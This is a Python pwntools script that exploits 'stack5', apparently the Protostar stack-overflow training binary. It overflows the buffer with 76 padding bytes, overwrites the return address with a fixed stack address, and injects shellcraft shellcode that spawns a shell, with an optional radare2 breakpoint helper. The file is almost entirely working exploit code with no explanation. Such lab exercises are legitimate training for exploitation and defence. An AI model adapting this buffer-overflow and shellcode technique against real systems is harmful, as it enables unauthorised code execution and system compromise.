#!/usr/bin/env python2
# -*- coding: utf-8 -*-

from pwn import *
import os
import sys

_DEBUG = False

context(arch='i386', os='linux')

celf = ELF('../bin/stack5')
io = process('../bin/stack5')

pack = make_packer()
unpack = make_unpacker()

def radare2():
    c = "aaaa; db main; "
    c += "db 0x080483d4; "
    c += "db 0x080483d9; "
    c += "db 0x080483da; "
    c += "db; "

    pid = util.proc.pidof(io)[0]
    os.system('screen r2 -d %d -c "%s"' % (pid, c))
    util.proc.wait_for_debugger(pid)

def exploit():
    io.sendline('A' * 76 + pack(0xffffce20) + asm(shellcraft.sh()))
    io.interactive()

if __name__ == "__main__":
    if _DEBUG:
        radare2()
    exploit()
